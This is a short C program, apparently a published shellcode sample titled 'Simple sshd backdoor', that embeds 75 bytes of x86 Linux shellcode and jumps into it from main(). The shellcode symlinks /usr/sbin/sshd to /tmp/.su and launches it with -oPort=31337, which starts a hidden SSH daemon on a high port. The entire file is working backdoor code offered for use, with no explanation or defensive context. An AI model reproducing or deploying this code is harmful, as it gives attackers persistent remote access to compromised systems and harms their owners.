/*
Simple sshd backdoor (75 Bytes)
Author: MMxM (@hc0d3r)
Sáb Mai  2 13:19:13 BRT 2015
*/

#include <stdio.h>
#include <string.h>

unsigned const char sc[] =
	"\x31\xc0"	//xor    %eax,%eax
	"\x31\xdb"	//xor    %ebx,%ebx
	"\x99"	//cltd
	"\x66\xbb\x68\x64"	//mov    $0x6468,%bx
	"\x53"	//push   %ebx
	"\x68\x6e\x2f\x73\x73"	//push   $0x73732f6e
	"\x68\x2f\x73\x62\x69"	//push   $0x6962732f
	"\x68\x2f\x75\x73\x72"	//push   $0x7273752f
	"\x89\xe3"	//mov    %esp,%ebx
	"\xb0\x53"	//mov    $0x53,%al
	"\x52"	//push   %edx
	"\x68\x2f\x2e\x73\x75"	//push   $0x75732e2f
	"\x68\x2f\x74\x6d\x70"	//push   $0x706d742f
	"\x89\xe1"	//mov    %esp,%ecx
	"\xcd\x80"	//int    $0x80
	"\x31\xc0"	//xor    %eax,%eax
	"\x89\xcb"	//mov    %ecx,%ebx
	"\x52"	//push   %edx
	"\x68\x31\x33\x33\x37"	//push   $0x37333331
	"\x68\x72\x74\x3d\x33"	//push   $0x333d7472
	"\x68\x2d\x6f\x50\x6f"	//push   $0x6f506f2d
	"\x89\xe1"	//mov    %esp,%ecx
	"\x52"	//push   %edx
	"\x51"	//push   %ecx
	"\x53"	//push   %ebx
	"\x89\xe1"	//mov    %esp,%ecx
	"\xb0\x0b"	//mov    $0xb,%al
	"\xcd\x80"	//int    $0x80
;

int main(void){
	printf("Shellcode lenght: %d\n", strlen(sc));
	__asm__ ("jmp sc");
	return 0;
}

